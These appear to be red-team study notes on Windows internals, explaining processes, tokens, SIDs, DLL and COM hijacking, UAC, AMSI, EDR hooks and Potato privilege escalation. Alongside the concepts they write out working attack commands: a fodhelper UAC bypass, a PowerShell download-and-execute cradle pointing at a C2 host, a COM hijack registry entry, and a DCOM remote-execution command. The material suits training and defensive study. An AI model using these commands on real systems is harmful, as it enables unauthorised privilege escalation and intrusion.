# Phase 00 — Deep Study Notes
### Windows Internals & Red Team Mindset
> Zero to solid foundation. Every section answers: **WHAT is it → WHY it exists → HOW it connects to attacks.**

---

## Before You Begin — How to Use These Notes

Each section is written as if you genuinely know nothing. No shortcuts, no assumed knowledge.

Every concept follows this exact structure:
```
🔷 WHAT  — What is this thing, defined simply
🔶 WHY   — Why does Windows have it, what problem does it solve
⚔️  HOW   — How attackers exploit or interact with it
🧠 LOCK IT IN — An analogy or visual to make it permanent
```

Read every section fully before moving to the next. Later sections refer back to earlier ones — the order matters.

---

# SECTION 1
## The Two Zones: Kernel Mode vs User Mode

---

### 🔷 WHAT

Your computer has a CPU, RAM, a hard drive, and a network card. When Windows runs, it divides all activity into **two completely separate zones**:

**Zone 1 — User Mode**
This is where your applications live. Notepad, Chrome, your game, your C2 beacon — all of them run in user mode. Each application gets its own private block of memory. Application A literally **cannot read** the memory of Application B. The OS enforces this isolation completely.

**Zone 2 — Kernel Mode**
This is where Windows itself runs. The core OS, hardware drivers, the memory manager. Code running in kernel mode has **unrestricted access to everything** — every byte of RAM, every hardware device, everything. There are no restrictions here.

```
┌─────────────────────────────────────────────────────────┐
│                      USER MODE                          │
│                                                         │
│   notepad.exe    chrome.exe    lsass.exe    beacon.exe   │
│   [isolated]     [isolated]    [isolated]   [isolated]   │
│                                                         │
│   Processes CANNOT directly read each other's memory.  │
│   They MUST ask the OS for permission first.            │
├─────────────────────────────────────────────────────────┤
│                     KERNEL MODE                         │
│                                                         │
│   Windows OS core | Memory Manager | Hardware Drivers   │
│                                                         │
│   NO restrictions. Full access. A crash here =          │
│   Blue Screen of Death (BSOD) — entire system dies.     │
└─────────────────────────────────────────────────────────┘
```

The line between these two zones is called the **security boundary**. Crossing from user mode into kernel mode requires going through the OS. You cannot jump directly.

---

### 🔶 WHY

Without this separation, any program on your computer could:
- Read your bank app's memory and steal your passwords
- Overwrite operating system code and take control of the machine
- Crash the entire computer by mistake

The two-zone model is the **foundation of all OS security**. Every other security feature (tokens, ACLs, integrity levels) only works because of this isolation. If you could break out of user mode into kernel mode at will, nothing else would matter.

---

### ⚔️ HOW

**LSASS** — the process that stores credentials — runs in **user mode**. This means you *can* access it, but only with the correct permissions. If Windows let anyone reach in freely, every process could steal every credential.

The entire game of privilege escalation is:
> *How do I get the OS to grant me permissions it was not supposed to grant me?*

**PPL (Protected Process Light)** — covered in Section 19 — pushes LSASS closer to kernel-level protection. To bypass PPL, you need a kernel driver. Kernel drivers run in kernel mode — which is why "Bring Your Own Vulnerable Driver" (BYOVD) attacks exist. You load a signed but vulnerable driver into kernel mode, exploit it, and use it to remove protections on LSASS from the level Windows trusts most.

---

### 🧠 LOCK IT IN

> **The hotel analogy**: The kernel is the hotel manager who has a master key to every room. User-mode processes are guests who each have a key to only their own room. Guest A cannot enter Guest B's room. To access a different room, you must ask the manager (OS). The manager checks who you are before giving you access.
>
> Privilege escalation = convincing the manager you deserve access to rooms you shouldn't have.

---

# SECTION 2
## Processes, Threads, and Handles

---

### 🔷 WHAT

**Process**
A process is a running program. When you double-click notepad.exe, Windows creates a process for it. That process gets:
- Its own private block of memory
- An identity (a security token — covered in Section 5)
- One or more threads to actually execute code

**Thread**
A thread is the actual unit that runs code. A process is a container; threads are workers inside that container. A single process can have many threads running simultaneously — that's how Chrome can render a page, play audio, and download a file at the same time.

**Handle**
When a process wants to interact with a Windows object — a file, another process, a registry key, a mutex — it must ask the OS to open it. The OS checks permissions and, if approved, returns a **handle**: a numbered ticket that represents your access to that object.

```
Your beacon.exe process
│
├─ IDENTITY: Token = "I am CORP\jdoe, Medium Integrity"
│
├─ HANDLES:
│   Handle #4  → C:\temp\output.txt    (you asked for: WRITE access → granted)
│   Handle #8  → lsass.exe process     (you asked for: VM_READ → DENIED if no SeDebugPrivilege)
│   Handle #12 → HKCU\Software\...     (you asked for: READ/WRITE → granted)
│
└─ THREADS: Thread 1 (main loop), Thread 2 (comms)
```

---

### 🔶 WHY

**Processes exist** because without isolation, a buggy program would corrupt memory used by other programs — or by the OS itself. Isolation means one crashing program doesn't take down your entire system.

**Threads exist** because modern computers need to do multiple things simultaneously. A single sequential program could only do one thing at a time.

**Handles exist** because you need a way to reference OS objects without handing out direct memory pointers. A handle is a controlled, validated reference. The OS chooses what access rights the handle carries based on what you requested and whether you had permission to request it.

---

### ⚔️ HOW

**Why handles matter for credential dumping**:

When Mimikatz tries to dump LSASS, it calls:
```
OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, lsass_pid)
```

Windows checks your token: do you have `SeDebugPrivilege`? 
- Yes → returns a valid handle → Mimikatz can read LSASS memory
- No → Access Denied → Mimikatz fails

The handle request is the observable event. EDRs watch for processes opening LSASS with `PROCESS_VM_READ` access. This is why modern dump techniques try to avoid calling `OpenProcess` on LSASS directly — they use process snapshots, handle duplication from already-running processes, or kernel-level access to bypass this detection point entirely.

**Why process isolation enables lateral movement**:

Because processes are isolated, the only way to read another process's memory or inject into it is through a valid handle with the right access rights. If you have `SeDebugPrivilege`, you can open any process. This is why escalating to SYSTEM (who has all privileges enabled) is usually step 1 of every engagement — it unlocks `SeDebugPrivilege`.

---

### 🧠 LOCK IT IN

> **The valet parking analogy**: A handle is a valet ticket. You don't get the car keys directly — you give your car to the valet (OS) and get a numbered stub (handle). When you present the stub, you get access to your car. But the access you get depends on what kind of valet arrangement you signed up for. If you signed "no joyriding" (read-only access), the stub won't let you drive the car out — just inspect it.

---

# SECTION 3
## DLLs and the DLL Search Order

---

### 🔷 WHAT

**DLL = Dynamic Link Library**

A DLL is a file of compiled code that multiple programs can share. Instead of every application shipping its own copy of standard functions (drawing windows, making network connections, encrypting data), they all load shared DLLs from disk.

```
notepad.exe loads:
  ├─ user32.dll   → "draw me a window, handle keyboard input"
  ├─ kernel32.dll → "create files, start processes, manage memory"
  └─ ntdll.dll    → "talk to the kernel directly"
```

These DLLs live in `C:\Windows\System32\`. Every Windows application uses them. Loading them from a shared location saves RAM because Windows maps one copy into all processes.

**The DLL search order** — when an app calls `LoadLibrary("something.dll")`, Windows looks in this sequence:

```
1. KnownDLLs (pre-loaded by the OS at boot — see below)
2. The application's own folder (e.g., C:\Program Files\App\)
3. C:\Windows\System32\
4. C:\Windows\System\
5. C:\Windows\
6. The current working directory
7. Every folder listed in the %PATH% environment variable
```

DLL hijacking relies on the DLL search order that Windows uses when loading DLL files. This search order is a sequence of locations a program checks when loading a DLL. The sequence can be divided into two parts: special search locations and standard search locations. You can find the search order comprising both parts

<img width="1856" height="2048" alt="image" src="https://github.com/user-attachments/assets/abb1a7cb-5391-46cd-87b5-b8e2ae5c8072" />

**Why Microsoft separates them**

The first six are decision points rather than folders:

Is the DLL redirected?
Is it an API Set?
Is there a Side-by-Side manifest?
Is it already loaded?
Is it a Known DLL?
Is it part of the package dependencies?

Only if none of those resolve the DLL does Windows begin searching actual directories.

Windows stops searching the moment it finds a match.

**KnownDLLs — the critical exception**:

At `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` there is a list of core DLLs (kernel32.dll, ntdll.dll, user32.dll, etc.). These are **never loaded from disk**. Windows loads them once at boot into shared kernel sections. You cannot replace them by dropping a file on disk — Windows never even looks on disk for them.

```
# KnownDLLs list (partial):
kernel32.dll ← CANNOT hijack from user space
ntdll.dll    ← CANNOT hijack from user space  
user32.dll   ← CANNOT hijack from user space
advapi32.dll ← CANNOT hijack from user space

# NOT in KnownDLLs (common hijack targets):
cryptbase.dll    ← CAN hijack
wlbsctrl.dll     ← CAN hijack
version.dll      ← CAN hijack (loaded by many apps)
```

**More on DLL Hijacking**:
https://unit42.paloaltonetworks.com/dll-hijacking-techniques/

---

### 🔶 WHY

DLLs exist to avoid code duplication. Without shared DLLs:
- Every program would ship its own copy of thousands of Windows functions
- RAM usage would be enormous
- Updating a common function (like fixing a security bug) would require updating every single application separately

The search order exists so Windows can find DLLs in application-specific locations first, then fall back to system locations. This allows applications to ship custom versions of DLLs if they need them.

---

### ⚔️ HOW

**DLL Hijacking**:

If an application tries to load a DLL that **doesn't exist** in the expected location, Windows walks through the search order until it finds a match. If you can place a file with that name in a directory that appears **earlier** in the search order — Windows loads your file instead.

```
VulnerableApp.exe (runs as SYSTEM) tries to load: missing_helper.dll

Windows search:
  Step 1: KnownDLLs?          → not listed
  Step 2: C:\Program Files\VulnerableApp\  ← writable by normal users?
          → YES → you drop evil.dll named missing_helper.dll here
          → Windows loads YOUR dll
          → Your code runs as SYSTEM
```

**Real-world example**: Many Windows services and applications try to load DLLs that either don't exist on the system or aren't in System32. Tools like `Procmon` (Process Monitor) from Sysinternals let you watch a process and see every DLL it tries to load, including the ones it fails to find — these are your hijack candidates.

**Why beginners fail**: They try to hijack `kernel32.dll` or `ntdll.dll` — KnownDLLs — and nothing happens. Windows never looks on disk for those. Target non-KnownDLL optional dependencies instead.

---

### 🧠 LOCK IT IN

> **The library shelves analogy**: Imagine a librarian who checks shelves in a fixed order to find a book. Some books are kept behind the counter (KnownDLLs) — she never walks to the shelves for those. For everything else, she checks shelf 1 first, then shelf 2, etc.
>
> DLL hijacking = placing a counterfeit book on shelf 1 before she reaches shelf 3 where the real book sits. She picks yours up without knowing it's fake.
>
> KnownDLLs = books kept behind the counter. You can't swap those — she never walks to the shelves.

---

# SECTION 4
## SIDs — The Real Identity in Windows

---

### 🔷 WHAT

A **SID (Security Identifier)** is a unique, permanent identifier assigned to every account — users, groups, computers, and even built-in Windows entities like SYSTEM.

**Critical fact**: Windows does **not** use usernames to make access decisions. It uses SIDs. Your username is just a human-readable label. Under the hood, every permission check, every group membership, every access control entry refers to SIDs.

**What a SID looks like**:
```
S-1-5-21-1234567890-9876543210-1122334455-1001

S          → "This is a SID"
1          → Revision number (always 1)
5          → Identifier Authority (5 = NT Authority, which means Windows)
21         → Sub-authority type (21 = domain or local machine account)
1234567890-9876543210-1122334455  → Domain Identifier (unique for each domain or machine)
1001       → RID — Relative Identifier (the account's number within this domain)
```

**RID = the account's serial number within its domain**. RIDs you must memorise:

| RID | What it means |
|-----|---------------|
| 500 | Built-in Administrator (local) |
| 501 | Built-in Guest (local) |
| 512 | Domain Admins group |
| 513 | Domain Users group |
| 516 | Domain Controllers group |
| 519 | Enterprise Admins group |
| 520 | Group Policy Creator Owners |

**Well-known fixed SIDs** (same on every Windows machine, no domain part):

| SID | What it means |
|-----|---------------|
| S-1-5-18 | SYSTEM — the OS itself |
| S-1-5-19 | Local Service |
| S-1-5-20 | Network Service |
| S-1-5-32-544 | Administrators (built-in local group) |
| S-1-1-0 | Everyone |

---

### 🔶 WHY

SIDs exist because usernames are fragile. If you renamed a user from "Alice" to "Alicia," all her permissions would break if they were stored by name. SIDs are immutable — they never change, even if the username changes. This makes the permission system stable.

SIDs are also unique. Two different domains can both have a user named "Administrator" but they have different SIDs — so there's no confusion between them.

---

### ⚔️ HOW

**Why SIDs matter for Golden Tickets**:

The Golden Ticket attack forges a Kerberos ticket. Inside every Kerberos ticket is a data structure called the **PAC** (Section 11) which lists the user's SIDs and group memberships. When you forge a ticket, you can put **any SIDs you want** into the PAC.

Put SID `S-1-5-21-[your-domain]-512` (Domain Admins group RID = 512) into your forged PAC → the Domain Controller sees a valid ticket claiming you're a member of Domain Admins → you get Domain Admin access. The username you put in is almost irrelevant. The SIDs are what matter.

**Why SIDs matter for local admin exploitation**:

Every Windows machine creates a local Administrator account with RID 500. The full SID is `S-1-5-21-[machine-specific-id]-500`. The machine-specific part is different on every machine. This means a local admin on Machine A is not automatically a local admin on Machine B — different SIDs, different machines.

However, Windows has an old behavior where if a domain account's NT hash matches the local Administrator (RID 500) account on a remote machine, Pass-the-Hash works. This is why re-using the same local admin password across all machines (common in enterprises) is catastrophic — you can PtH from any compromised machine to every other machine.

---

### 🧠 LOCK IT IN

> **SIDs are Social Security Numbers**. Your name can change (rename the account), your job title can change (change group memberships), but your SSN never changes. The government (Windows) doesn't look up your name — it looks up your number.
>
> A Golden Ticket is a forged government ID with a fraudulent SSN. The system checks the ID's cryptographic seal (valid — you forged it with the real seal) and trusts the SSN inside it (which you set to anything you want).

---

# SECTION 5
## Access Tokens — The Heart of Windows Security

---

### 🔷 WHAT

An **access token** is the security credential carried by every process (and every thread that's impersonating someone). It's the OS's answer to: **"Who is this process and what is it allowed to do?"**

When you log in to Windows, the OS creates an access token for your session. Every process you start inherits a copy of that token.

**What's inside a token**:
```
Your cmd.exe token contains:
├─ Your SID:        S-1-5-21-...-1001  (you — jdoe)
├─ Group SIDs:      S-1-5-21-...-513   (Domain Users)
│                   S-1-5-21-...-1104  (IT_Support group)
│                   S-1-5-32-544       (Administrators — if local admin)
├─ Privileges:      SeShutdownPrivilege (disabled)
│                   SeChangeNotifyPrivilege (enabled)
│                   SeDebugPrivilege    (present but DISABLED if not elevated)
├─ Integrity Level: Medium
└─ Logon Session:   Unique ID for this login
```

When you try to open a file, a process, or a registry key, Windows extracts your token and compares it against the object's permissions list (DACL). Match → access granted. No match → Access Denied.

---

### Two types of tokens

**Primary Token**: The main identity of an entire process. Created when the process starts. Child processes inherit it (unless overridden).

**Impersonation Token**: A temporary token used by a single **thread** to act as a different user. Services use this to handle requests on behalf of clients. A thread's impersonation token can be completely different from its process's primary token.

Example: IIS (the web server process) runs as `NETWORK SERVICE` (primary token). When handling your web request, a thread inside IIS can briefly impersonate *you* to check file permissions — this is legal Windows design.

---

### Four impersonation levels — the detail everyone skips

When a thread receives an impersonation token, the token carries a level that limits what can be done with it:

| Level | What the receiving process can do |
|-------|----------------------------------|
| **Anonymous** | Doesn't even know who authenticated |
| **Identification** | Can check who you are but **cannot act as you** |
| **Impersonation** | Can fully act as you — **on the local machine only** |
| **Delegation** | Can act as you — **on remote machines too** (Kerberos only) |

**Why this is critical for attacks**:

Potato attacks produce a SYSTEM token at `SecurityImpersonation` level. This is enough to:
- Run a process as SYSTEM locally ✓
- Read/write local files as SYSTEM ✓

But it is **NOT** enough to:
- Authenticate to a remote machine as SYSTEM ✗

`SecurityDelegation` tokens only appear in specific scenarios involving Kerberos delegation (Section 12). This is exactly why unconstrained delegation machines are so valuable — they receive delegation-level TGTs.

---

### Key privileges

| Privilege | Grants | Attack use |
|-----------|--------|------------|
| `SeDebugPrivilege` | Open ANY process for read/write | Dump LSASS, inject into processes |
| `SeImpersonatePrivilege` | Use impersonation tokens from connecting clients | All Potato attacks → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Replace a process's primary token | Alternative path to SYSTEM |
| `SeLoadDriverPrivilege` | Load/unload kernel drivers | Bypass PPL, install rootkits |
| `SeTakeOwnershipPrivilege` | Take ownership of any object | Override locked-down files |
| `SeBackupPrivilege` | Read any file ignoring ACLs | Dump SAM/SYSTEM hive as backup |
| `SeRestorePrivilege` | Write to objects ignoring ACLs | Registry manipulation |

**Important**: Privileges can be present but **disabled**. Disabled ≠ absent. Many privileges can be re-enabled programmatically within the same session without any special tools. Running `whoami /priv` always tells you what's there, but the Enabled/Disabled column is a runtime state.

---

### 🔶 WHY

Without access tokens, Windows would need to look up the user's permissions in a database every single time any operation happened. Tokens cache that information — they're computed at login and carried along with the process, so permission checks are fast.

Tokens also enable the service model. A single service process can handle requests from many different users by temporarily impersonating each one. Without impersonation tokens, every user would need their own dedicated service process.

---

### ⚔️ HOW

**Token theft in practice** — the core of Potato attacks:

```
You compromise a web app running as IIS (w3wp.exe)
IIS's primary token: NETWORK SERVICE (has SeImpersonatePrivilege by design)

You run GodPotato:
  → Creates a named pipe (Section 9)
  → Coerces the SYSTEM process to connect via COM (Section 8)
  → Calls ImpersonateNamedPipeClient()
  → Receives a SYSTEM token at SecurityImpersonation level
  → Calls CreateProcessWithToken(system_token, ..., "cmd.exe")
  → Result: cmd.exe running as SYSTEM
```

**Why SeImpersonatePrivilege is granted to service accounts by design**:
IIS, MSSQL, and similar services need to impersonate users for legitimate purposes (checking file permissions, running stored procedures as the calling user, etc.). Microsoft grants them `SeImpersonatePrivilege` so they can do this legally. Attackers abuse this exact design decision.

---

### 🧠 LOCK IT IN

> **The access token is your employee badge**. It lists your name (SID), your department memberships (group SIDs), and what doors you're allowed through (privileges). Security checks compare your badge to the door's access list.
>
> Impersonation = borrowing a colleague's badge temporarily. The level determines how far you can go with their badge — some badges only work inside the building (Impersonation level), others work at partner offices too (Delegation level).

---

# SECTION 6
## Integrity Levels and UAC

---

### 🔷 WHAT

On top of the normal permission system (tokens + ACLs), Windows has a **second, independent access control layer** called **Mandatory Integrity Control (MIC)**. Every process and every object has an **integrity level**.

**The integrity levels from lowest to highest**:
```
Untrusted  → Browser sandboxes, isolated tab processes
Low        → Internet Explorer protected mode, sandboxed apps
Medium     → ALL normal user processes, even if the user is a local admin
High       → Elevated processes ("Run as Administrator")
System     → Windows service processes running as SYSTEM
Protected  → PPL-protected processes (Section 19)
```

**The rule**: A process can write to objects at its own level or below. It cannot write up to a higher-integrity object. This is enforced regardless of your token's group memberships.

**Why this matters immediately**:

When you log in as a local admin, your processes still start at **Medium** integrity. Even though your token contains the Administrators group SID, your actual running processes can't use those admin rights until explicitly elevated. This is UAC.

---

### UAC — what it actually is

**UAC (User Account Control)** is the mechanism that controls when a user transitions from Medium to High integrity.

**How Windows handles admin login**:
```
You log in as a Local Admin
Windows creates TWO tokens:
  Token A: Filtered token  (Medium integrity, admin SIDs removed or disabled)
  Token B: Full admin token (High integrity, all admin SIDs active)

When you open cmd.exe normally → Token A (Medium) → limited
When you right-click → "Run as administrator" → UAC prompt → Token B (High) → full admin
```

This is why `whoami /groups` can show `Administrators` group but you still can't write to `C:\Windows\System32\` — the Administrators SID in Token A is flagged as "deny only," meaning it's used for deny checks but doesn't grant access.

**Checking your integrity level** (you should do this before every attack phase):
```
whoami /groups | findstr "Label"

Mandatory Label\Low Mandatory Level    → sandboxed, very limited
Mandatory Label\Medium Mandatory Level → not elevated — may need UAC bypass
Mandatory Label\High Mandatory Level   → elevated — proceed with admin operations
Mandatory Label\System Mandatory Level → SYSTEM — maximum access
```

---

### UAC bypass: FodHelper

`fodhelper.exe` (Features on Demand helper) is a Microsoft binary marked for **auto-elevation** — it can reach High integrity without showing a UAC prompt. Windows trusts it because it's a signed Microsoft binary.

The exploit uses a registry key that `fodhelper.exe` reads before it launches:
```
HKCU\Software\Classes\ms-settings\shell\open\command
```

This key is under HKCU — which is writable by any user. You write your payload path here. `fodhelper.exe` reads it, runs it, and because `fodhelper.exe` auto-elevates, your payload runs at High integrity.

```
Step 1: Write your payload to the registry key:
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f

Step 2: Launch fodhelper:
start fodhelper.exe

Step 3: cmd.exe opens at HIGH integrity — no UAC prompt
```

**Why it works**: `fodhelper.exe` is trusted to auto-elevate (so no prompt). It reads a registry key you control (HKCU, user-writable) to decide what to launch. Two design decisions collide to produce the bypass.

---

### 🔶 WHY

Before UAC (Windows XP era), every admin was always at full admin rights all the time. A single malicious program could instantly compromise the whole system just by running as a logged-in admin user.

UAC was introduced to require **explicit approval** for administrative actions, reducing the blast radius of malware. Even if malware runs under your account, it starts at Medium integrity and cannot do admin things without triggering a UAC prompt.

**Remember**: UAC is NOT a security boundary. Microsoft says this officially. It's a speed bump for casual attackers and accidents. Determined attackers bypass it consistently because there are dozens of known techniques.

---

### ⚔️ HOW

**Practical OPSEC impact**:

When your beacon lands on a box:
1. Run `whoami /groups | findstr "Label"` immediately
2. If Medium → you're limited. UAC bypass before any admin operations
3. If High → proceed. Most escalation techniques work
4. If System → maximum access, can dump LSASS, access any process

**Why Medium integrity blocks you**:
- Cannot write to `HKLM` registry keys
- Cannot modify system files in `C:\Windows\`
- Cannot access other users' processes
- Most privilege escalation techniques require High or System

---

### 🧠 LOCK IT IN

> **UAC is a locked door with a buzzer**. Just because you have a key to the building (local admin account) doesn't mean every door inside is automatically open. Interior doors labelled "Admin Only" require you to buzz in (UAC prompt). UAC bypass = finding a staff member with an auto-opening badge who you can trick into carrying your package through the door for you.
>
> Medium integrity = you're inside the building but can't access the server room. High integrity = you're inside the server room. System = you're the building itself.

---

# SECTION 7
## AMSI and the Detection Architecture

---

### 🔷 WHAT

When you run offensive tools on a Windows machine, several defensive systems are watching. Understanding what they are — and where they sit — tells you why your tools get caught and what you're fighting before your first command executes.

---

### AMSI — Antimalware Scan Interface

**AMSI** is a Windows interface that allows security products (Windows Defender, CrowdStrike, SentinelOne, etc.) to scan content **before it executes** — even if that content is entirely in memory and never wrote a file to disk.

AMSI is injected into:
- PowerShell (every line, every script block)
- VBScript and JScript
- .NET `Assembly.Load()` calls
- WMI script execution
- Office macro execution

**How AMSI works step by step**:
```
You type in PowerShell:
  PS> IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')

What happens:
  1. PowerShell downloads the payload into memory (no file written to disk)
  2. Before executing even one line, PowerShell passes the content to AMSI
  3. AMSI passes it to the installed security product (e.g., Defender)
  4. Defender scans the raw content in memory
  5a. Clean → PowerShell executes the content
  5b. Flagged → PowerShell throws "This script contains malicious content" error
                 Your payload never runs
```

**The critical insight**: Traditional AV evasion (packing or encoding a file so its hash changes) does NOT defeat AMSI. By the time AMSI scans, the content has been decoded into its final form in memory. The payload is fully decoded before AMSI sees it — it sees the final content, not the encoded wrapper.

---

### The AMSI bypass concept

The function that does the scanning is `AmsiScanBuffer` inside `amsi.dll`. This DLL is loaded into every PowerShell (and other AMSI-enabled) process. If you patch it to always return "clean" (`AMSI_RESULT_CLEAN`), AMSI stops scanning for that process session.

```
Conceptual bypass (not real code — real code is always obfuscated):
  1. Find amsi.dll loaded in the current process memory
  2. Find the AmsiScanBuffer function address
  3. Overwrite the first few bytes with: xor eax,eax; ret
     (This makes it always return 0 = AMSI_RESULT_CLEAN)
  4. AMSI now passes everything as clean
```

**The meta-problem**: The bypass code itself gets detected by AMSI before it can run. Every bypass snippet is a known pattern. So bypass code is always obfuscated — you're fighting the defender's scanner with code that has to avoid being detected by the scanner you're trying to disable.

Full bypass techniques are Phase 04 content. Here: understand the architecture.

---

### ETW — Event Tracing for Windows

**ETW** is the logging backbone of the entire Windows OS. It's not just Sysmon event logs — ETW providers are embedded in the kernel and in every major Windows subsystem.

**EDRs subscribe to ETW kernel providers** and receive telemetry in real time. This happens at a level below Sysmon and below the Windows Event Log. Disabling Sysmon doesn't help against ETW-based EDR telemetry.

What EDRs can see via ETW:
- Every process creation with full command line and parent PID
- Memory allocation patterns (VirtualAlloc, WriteProcessMemory calls)
- Image loading (which DLLs were loaded into which process, and when)
- Network connections at the socket level
- .NET runtime events (which assemblies were loaded)

---

### EDR usermode hooks — how your tools get intercepted

Modern EDRs inject a DLL into every process on the system. That DLL patches the first bytes of sensitive functions in `ntdll.dll` to redirect execution through the EDR's analysis code.

```
Without EDR:
  Your tool calls CreateRemoteThread(target_pid, ...)
  → Windows resolves this to ntdll.NtCreateThreadEx
  → ntdll makes a syscall (crosses into kernel mode)
  → Thread is created

With EDR hooks:
  Your tool calls CreateRemoteThread(target_pid, ...)
  → EDR's patched jump at the start of NtCreateThreadEx fires first
  → Execution goes to EDR's analysis code
  → EDR decides: allow (passes to real NtCreateThreadEx) or block (kills process)
```

**Why direct syscalls bypass hooks**:

The hooks live in ntdll.dll, which is in **user mode**. The actual kernel functionality lives below ntdll. If your tool calls the kernel directly (using the correct syscall number without going through ntdll) it bypasses the EDR's hook entirely — the hook is never reached.

Tools like Syswhispers2 and Hell's Gate implement direct syscalls. Understanding that the hook is a user-mode patch on ntdll makes these techniques logical rather than mysterious.

---

### 🔶 WHY

**AMSI exists** because modern malware stopped touching disk. Fileless attacks (PowerShell, .NET loaded in memory) completely bypassed traditional file-based AV. AMSI was Microsoft's solution: scan at the point of execution, regardless of whether a file exists.

**ETW exists** as the OS-wide diagnostics framework — originally for performance monitoring, repurposed by security products. EDRs use it because it's low-level and hard to disable from user space.

**Hooks exist** because security products need to intercept dangerous API calls before they execute. Patching ntdll's functions is the simplest way to insert inspection code at the call site.

---

### ⚔️ HOW

**Your attack lifecycle vs the detection stack**:
```
You encode a payload and download it → file-based AV (not AMSI — no execution yet)
You decode and run it in memory      → AMSI kicks in here
You call sensitive Windows APIs      → EDR usermode hooks intercept here
You make a syscall                   → ETW kernel providers log here
Your process tree/network is visible → Sysmon + SIEM see the pattern here
```

Each evasion technique targets a specific layer. There is no single bypass for everything. This is why modern red team tooling is complex — you're navigating a multilayer detection architecture.

---

### 🧠 LOCK IT IN

> **AMSI is a checkpoint at the factory exit, not the loading dock**. Traditional AV checked the loading dock (file written to disk). AMSI waits at the factory exit (point of execution) and searches you there — no matter how you arrived.
>
> EDR hooks are undercover inspectors inside every workshop (process). The moment you pick up a dangerous tool (sensitive API call), the inspector is watching.

---

# SECTION 8
## COM — The Invisible Glue

---

### 🔷 WHAT

**COM (Component Object Model)** is a Windows framework that lets software components expose functionality to other programs, regardless of programming language or whether they're in the same process or different processes.

If you've ever right-clicked on a file and gotten the "Send to" menu, or used Windows Shell extensions, or used any Office automation — that was COM.

**The key concepts**:

**CLSID (Class Identifier)**: Every COM component has a unique identifier (a GUID — a 128-bit unique number). CLSIDs are registered in the Windows registry.

**Where CLSIDs are registered**:
```
For all users (requires admin to modify):
  HKLM\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32 → C:\Windows\System32\real.dll

For current user only (writable by any user):
  HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32 → (normally empty)
```

When code calls `CoCreateInstance({GUID})`, Windows looks up that GUID in the registry, finds the binary path, and loads it.

**The HKCU-before-HKLM rule**: Windows checks HKCU first, then HKLM. This is intentional — it allows per-user customisation. It also creates an attack surface.

---

### 🔶 WHY

Without COM, every application that wanted to expose functionality to other apps would need to define its own custom protocol. COM standardises this: any COM component can be used by any COM-aware application, regardless of how either was built.

COM also enables cross-process and even cross-machine interaction. DCOM (Distributed COM) extends this to remote machines — you can invoke a COM component on a remote Windows machine using DCOM.

---

### ⚔️ HOW

**COM Hijacking**:

If an application tries to load a COM object (by CLSID) that:
- Is registered in HKLM (the real one), AND
- Is NOT registered in HKCU

...then Windows checks HKCU first, finds nothing, then falls back to HKLM and loads the real one. Normal operation.

**The attack**: You register your own DLL path under that same CLSID in HKCU. Now when Windows checks HKCU — it finds your entry first. Your DLL loads instead of the real one. All without admin rights.

```
Target: Application X loads COM object {ABCD-1234-...} at startup
        {ABCD-1234-...} is in HKLM, not HKCU
        
You:
  reg add "HKCU\SOFTWARE\Classes\CLSID\{ABCD-1234-...}\InprocServer32" /ve /d "C:\temp\evil.dll" /f
  
Next time Application X starts:
  → Checks HKCU\...\{ABCD-1234-...} → finds C:\temp\evil.dll → loads it
  → Your code runs inside Application X's process
  → No admin rights needed, nothing modified in HKLM
```

**UAC bypass via COM auto-elevation**:

Some COM objects are marked with `Elevation: Enabled` and approved for auto-elevation. When invoked, they instantiate at High integrity without a UAC prompt. `fodhelper.exe` (Section 6) works because it calls one of these COM objects.

**Potato attacks via COM**:

Potato variants coerce the SYSTEM account to authenticate via COM activation paths. GodPotato abuses the EfsRpc COM interface — it triggers a COM call that causes SYSTEM to make an RPC call that you intercept, giving you a SYSTEM impersonation token. Without understanding COM, you just see "run this tool, get SYSTEM" with no understanding of the mechanism.

**DCOM lateral movement**:

With valid credentials, you can invoke COM objects on remote machines via DCOM to execute code without touching disk on the target:
```
dcomexec.py CORP/jdoe:Password@192.168.1.10 "cmd.exe /c whoami"
```

---

### 🧠 LOCK IT IN

> **COM is a restaurant intercom system**. Each kitchen station has an extension number (CLSID). Waiters (processes) call extension numbers to request things from the kitchen (other components). The directory of extension numbers is the registry.
>
> COM hijacking = changing the directory entry for one extension to point to your phone instead of the real kitchen station. The waiter dials the same number but reaches you. You pretend to be the kitchen.

---

# SECTION 9
## Named Pipes and IPC

---

### 🔷 WHAT

**IPC = Inter-Process Communication**. Processes are isolated (Section 2) — they can't read each other's memory directly. But they often need to talk to each other. Windows provides several ways for processes to communicate. The most important for red teaming is **named pipes**.

**What a named pipe is**:

A named pipe is a communication channel with a name, like `\\.\pipe\myservice`. It behaves like a two-way file: one side writes data, the other side reads it. Unlike regular files, named pipes are used for real-time communication.

```
Server process                    Client process
Creates: \\.\pipe\myservice
Calls WaitForConnection()   ←→   Connects to \\.\pipe\myservice
Reads client messages             Writes requests
Writes responses                  Reads responses
```

**Named pipes work over the network too**: SMB exposes named pipes over port 445. When you do `net use`, browse a share, or connect via PsExec, you're using named pipes over SMB.

---

### 🔶 WHY

Windows services need to communicate with client applications. A print service needs to receive print jobs. An authentication service needs to receive authentication requests. Named pipes give them a fixed address (`\\.\pipe\name`) that clients can connect to, while the OS handles the underlying IPC complexity.

---

### ⚔️ HOW

**The mechanism behind Potato attacks**:

When a client authenticates to a named pipe server, the **server** receives an impersonation token for that client. This is the OS's way of letting the server act on the client's behalf — standard, legitimate Windows design.

Potato attacks weaponise this exact mechanism:

```
Step 1: You (running as IIS/MSSQL — has SeImpersonatePrivilege)
        Create a named pipe server: \\.\pipe\fake_service

Step 2: Coerce a SYSTEM-level process to authenticate to your pipe.
        (How you coerce SYSTEM differs per Potato variant — see below)

Step 3: When SYSTEM connects, call:
        ImpersonateNamedPipeClient()
        → OS hands you a SYSTEM impersonation token
        
Step 4: You have SeImpersonatePrivilege (your service account)
        → CreateProcessWithToken(system_token, "cmd.exe")
        → cmd.exe runs as SYSTEM
```

**Potato variants — what differs and what's the same**:

The pipe + impersonation steps are **identical** in every Potato. What differs is how each coerces SYSTEM:

| Variant | How SYSTEM is coerced |
|---------|----------------------|
| **PrintSpoofer** | Abuses Print Spooler's named pipe impersonation |
| **SweetPotato** | Combines DCOM activation + scheduled task COM path |
